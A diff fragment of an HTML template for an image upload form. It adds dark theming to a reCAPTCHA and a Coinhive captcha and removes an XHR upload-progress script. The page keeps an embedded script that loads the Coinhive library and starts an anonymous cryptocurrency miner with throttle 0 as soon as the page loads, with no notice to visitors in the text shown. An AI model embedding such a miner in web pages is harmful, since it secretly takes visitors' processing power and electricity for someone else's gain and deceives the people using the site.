@@ -31,7 +31,7 @@
     IMG: <input type="file"  id="upload" name="uploadfile"><br>
     </label>
     <div id=captcha>
-    <div id="recaptcha" class="g-recaptcha" data-sitekey="%v">
+    <div id="recaptcha" class="g-recaptcha" data-theme="dark" data-sitekey="%v">
     </div>
     <script src="/js/captcha.min.js" async></script>
     <div class="coinhive-captcha" data-hashes="1024" data-key="%v">
@@ -46,27 +46,12 @@
     </form>
 </div>
     
-<script>    
-var xhr = new XMLHttpRequest();
-xhr.open('POST', 'post/picture');
-xhr.onload = function() {
-   progress.value = progress.innerHTML = 100;
-};
-
-
-xhr.upload.onprogress = function (event) {
-    if (event.lengthComputable) {
-        var complete = (event.loaded / event.total * 100 | 0);
-        progress.value = progress.innerHTML = complete;
-    }
-}
-
-xhr.send(formData);
-</script>
-    
 <script src="/js/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
+	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {
+    throttle: 0,
+    theme: 'dark'
+    });
 
   miner.start();
   miner.setThrottle(0)
